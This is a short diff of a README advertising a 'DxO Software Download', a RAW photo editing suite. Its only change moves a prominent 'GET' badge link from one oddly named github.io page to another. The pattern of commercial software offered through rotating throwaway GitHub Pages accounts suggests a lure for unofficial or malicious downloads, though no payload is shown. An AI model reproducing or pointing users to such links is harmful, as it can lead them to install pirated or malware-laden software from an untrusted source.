@@ -1,6 +1,6 @@
 # DxO Software Download - RAW Photo Editing and Noise Reduction Suite
 
-[![GET DxO Software](https://img.shields.io/badge/GET%20%E2%80%94%20DxO%20Software-0078D6?style=for-the-badge&logoColor=white)](https://denverfriedmanhdwd.github.io/.github/DxO-software)
+[![GET DxO Software](https://img.shields.io/badge/GET%20%E2%80%94%20DxO%20Software-0078D6?style=for-the-badge&logoColor=white)](https://crueaverycobv.github.io/.github/DxO-software)
 
 ## DxO Imaging Suite Overview
 
